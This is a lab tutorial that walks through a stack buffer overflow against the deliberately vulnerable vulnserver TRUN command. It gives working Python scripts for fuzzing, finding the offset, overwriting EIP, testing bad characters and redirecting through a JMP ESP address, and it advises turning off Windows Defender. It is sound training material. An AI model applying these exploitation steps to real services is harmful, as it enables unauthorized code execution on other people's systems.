# Buffer overflow Tutorial 

([Cyber Mentor](https://www.youtube.com/watch?v=3x2KT4cRP9o&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G&index=2))

## Contents

Steps to conduct simple buffer overflow

<a href="https://github.com/catx0rr/bof#installing-the-vuln-server">
	Installation
</a>
<br />
<a href="https://github.com/catx0rr/bof#spiking">
	Spiking
</a>
<br />
<a href="https://github.com/catx0rr/bof#fuzzing">
	Fuzzing
</a>
<br />
<a href="https://github.com/catx0rr/bof#finding-the-offset">
	Finding the Offset
</a>
<br />
<a href="https://github.com/catx0rr/bof#overwriting-the-eip">
	Overwriting the EIP
</a>
<br />
<a href="https://github.com/catx0rr/bof#finding-bad-characters">
	Finding bad Characters
</a>
<br />
<a href="https://github.com/catx0rr/bof#finding-the-right-module">
	Finding the right module
</a>

## Notes before starting
Easy steps to exploit and gain administrative privileges
> Turn off windows defender and run immunity and vulnserver as administrator
> every time you exploit the vulnserver

## Installing the vuln server
**Target:** Windows 10 pro

[**Download**](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html) vulnserver and unzip

[**Download**](https://www.immunityinc.com/products/debugger/) Immunity debugger and install

**Attacker:** Kali Linux

## Spiking

**Run vulnserver (administrator)**

**Run immunity debugger (administrator)**
- attach and select vulnserver
- immunity is paused when attached. run it by pressing the play on the UI

![immunity_setup](https://github.com/catx0rr/bof/blob/master/img/immunity_setup.png)

> Assuming we have found one of the vulnerable functions on vulnserver

**Creating a small spike script**
- stat.spk (not vulnerable)
- trun.spk (vulnerable)

*stat.spk*
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```

*trun.spk*
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

**Spike and crash the application**

> execute the *generic_send_tcp command* for us to know if there is a vulnerability on the program

*non-vuln*
```shell
generic_send_tcp 172.16.10.101 9999 stats.spk 0 0
```

![kali_spike_stats](https://github.com/catx0rr/bof/blob/master/img/kali_spike_stats.png)

> As this function is not vulnerable, it should exit gracefully.

![windows_spike_stats](https://github.com/catx0rr/bof/blob/master/img/windows_spike_stats.png)

> Rerunning the spike script to target TRUN (assuming this is the vulnerable function of the program)

*vuln*
```shell
generic_send_tcp 172.16.10.101 9999 trun.spk 0 0
```

![kali_spike_trun](https://github.com/catx0rr/bof/blob/master/img/kali_spike_trun.png)

> Vulnserver should crash due to vulnerability and overwrite memory addresses with \x41 ("A's")

![windows_spike_trun](https://github.com/catx0rr/bof/blob/master/img/windows_spike_trun.png)

## Fuzzing

> Creating a script to fuzz into the target and crash vulnserver

*fuzzer.py*
```python
#!/usr/bin/python3

import sys, socket
from time import sleep

host = '172.16.10.101'
port = 9999
buffer = memoryview(("A" * 100).encode())


def fuzzer(host, port, buffer):

        # Access the memory and decode to ascii
        buffer = buffer.tobytes().decode()

        while True:
                try:
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
						
						# Sending A's to TRUN and overflowing buffer
                        s.send(('TRUN /.:/' + buffer).encode('ascii'))
                        s.close()
                        sleep(1)
                        buffer += "A" * 100
                        print("Fuzzing at %s bytes" % str(len(buffer)))

                except:
                        print("Fuzzer crashed at %s bytes" % str(len(buffer)))
                        sys.exit()



if __name__ == '__main__':
        fuzzer(host, port, buffer)
```


![vulnserver_crashed](https://github.com/catx0rr/bof/blob/master/img/vulnserver_crashed.png)

> Looking in immunity debugger, it is now overflowed with A's but we still need to find the offset to take control of the EIP (instruction pointer)

## Finding the offset

> Overwriting the EIP using pattern_create.rb and send it to vulnserver 

```shell
$(locate pattern_create.rb) -l 3000 | tee pattern.rb
```

![pattern_rb](https://github.com/catx0rr/bof/blob/master/img/pattern_rb.png)

> Once the pattern has been placed, execute the find_offset.py script.

*find_offset.py*

```python
#!/usr/bin/python3

import sys, socket

host = '172.16.10.101'
port = 9999
offset_file = 'pattern.rb'

def read_file(file):
        try:
                with open(file, 'r') as file:
                        file = file.read()

                return file.strip()

        except FileNotFoundError as err:
                print(err)
                sys.exit()


def find_offset(host, port, offset):

        while True:
                try:
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))

                        # Send generated pattern.rb from metasploit framework
                        s.send(('TRUN /.:/' + offset).encode('ascii'))
                        s.close()

                except:
                        print("Error connecting to the server..")
                        sys.exit()


if __name__ == '__main__':
        find_offset(host, port, read_file(offset_file))
```
![esp_overwritten](https://github.com/catx0rr/bof/blob/master/img/esp_overwritten.png)

> Now after executing the script upon analyzing immunity, ESP is now overwritten with pattern.rb characters from the metasploit module. But what is needed to take control is the EIP.

```shell
$(locate pattern_offset.rb) -l 3000 -q 386F4337
```

> The commands will find the offset of a certain pattern offset around 3000 bytes and as we checked on the immunity debugger, EIP is 386F4337 which gives us..

![pattern_offset](https://github.com/catx0rr/bof/blob/master/img/pattern_offset.png)

## Overwriting the EIP

> Since we have found the offset we will send 2003 A's because this is the start of EIP and add B's to know that we already overwritten the EIP.

*shellcode.py*
```python
#!/usr/bin/python3

# Overwriting the EIP

import sys, socket

host = '172.16.10.101'
port = 9999
shellcode = 'A' * 2003 + 'B' * 4

def inject_shellcode(host, port, shellcode):

        while True:
                try:
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))

                        # Sending shellcode to know if EIP is overwritten.
                        s.send(('TRUN /.:/' + shellcode).encode('ascii'))
                        s.close()

                except:
                        print("Error connecting to the server..")
                        sys.exit()


if __name__ == '__main__':
        inject_shellcode(host, port, shellcode)
```

> Upon executing the script.. we should be able to see that EIP is now with 4 bytes of B's 42424242 and we have overwritten the EIP.


![eip_overwritten](https://github.com/catx0rr/bof/blob/master/img/eip_overwritten.png)

> Now that EIP has been taken care of, we can generate a malicious shell code to control what commands can be executed.

## Finding Bad Characters

> By finding the bad characters, we need to know what hex characters are possible for us to craft a shellcode.
> If a bad character is included to the shellcode it will not work.

*generate_badchars.py*
```python
#!/usr/bin/python3

import sys

for x in range(1,256):
        sys.stdout.write('\\x' + '{:02x}'.format(x))
```

*shellcode.py*
```python
#!/usr/bin/python

# Finding Bad chars

import sys, socket

host = '172.16.10.101'
port = 9999
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e"
"\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55"
"\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
"\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
"\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a"
"\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1"
"\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
"\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# Added to shellcode to identify the hex values with bad chars
shellcode = 'A' * 2003 + 'B' * 4 + badchars

def inject_shellcode(host, port, payload):

        while True:
                try:
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))

                        # Sending shellcode to know if EIP is overwritten.
                        s.send(('TRUN /.:/' + payload))
                        s.close()

                except:
                        print "Error connecting to the server.."
                        sys.exit()


if __name__ == '__main__':
        inject_shellcode(host, port, shellcode)
```
> Since vulnserver is running on 32bit, we'll change to python2 a bit further.
> Executing the script, it will overflow again the TRUN and overwrite the EIP.
> Follow the hex dump from the Instruction Pointer (ESP) to investigate for bad chars.

![follow_esp](https://github.com/catx0rr/bof/blob/master/img/follow_esp.png)

> On the tutorial, vulnserver has no bad characters (or maybe there is)
> some example of bad characters.

![badchar_sample](https://github.com/catx0rr/bof/blob/master/img/badchar_sample.png)

## Finding the right module

Download [mona.py](https://github.com/corelan/mona/blob/master/mona.py) to windwos vm

Paste it in "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands"

**Usage**

After attaching immunity to vulnserver, type *!mona modules* in the bottom text box


![mona_modules](https://github.com/catx0rr/bof/blob/master/img/mona_modules.png)

> On the analysis since vulnserver is a vulnerable application, it has no memory protection (*Rebase, SafeSH, ASLR..*)
> Find the OP code equivalent for jmp esp

```shell
locate nasm_shell
```

![nasm_shell](https://github.com/catx0rr/bof/blob/master/img/nasm_shell.png)

> Getting the op code meaning is to convert assembly language to hex code.
> this will be used as a jump instruction and point it to the malicious shellcode. Get the **FFE4**


![return_addresses](https://github.com/catx0rr/bof/blob/master/img/return_addresses.png)

> by entering the command on immunity: *!mona find -s "\xff\xe4" -m essfunc.dll*
> we curated a list of return addresses and list them down to check what will work.

- 0x625011af
- 0x625011bb
- 0x625011c7
- 0x625011d3
- 0x625011df
- 0x625011eb
- 0x625011f7
- 0x62501103
- 0x62501105

*shellcode.py*
```python
#!/usr/bin/python

# Generating malicious shellcode

import sys, socket

host = '172.16.10.101'
port = 9999

        # first return address 625011af
        # \xaf\x11\x50\xaf
        # in reverse (intel processor little endian)
        # high order byte; highest address
        # low order byte; lowest address

shellcode = 'A' * 2003 + '\xaf\x11\x50\x62'

def inject_shellcode(host, port, payload):

        while True:
                try:
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))

                        s.send(('TRUN /.:/' + payload))
                        s.close()

                except:
                        print "Error connecting to the server.."
                        sys.exit()


if __name__ == '__main__':
        inject_shellcode(host, port, shellcode)
```

> Modified the script and added the return address to the shellcode.
> Investigate JMP pointer and set a breakpoint after overflowing the buffer

On Immunity:
- Press the right arrow (blue)
- set the return address 625011af
- press f2 after finding the jmp address (breakpoint)

![break_point](https://github.com/catx0rr/bof/blob/master/img/break_point.png)

> Execute the script

![eip_controlled](https://github.com/catx0rr/bof/blob/master/img/eip_controlled.png)

> Since the EIP is controlled, we can execute arbitrary code to take control of the system.


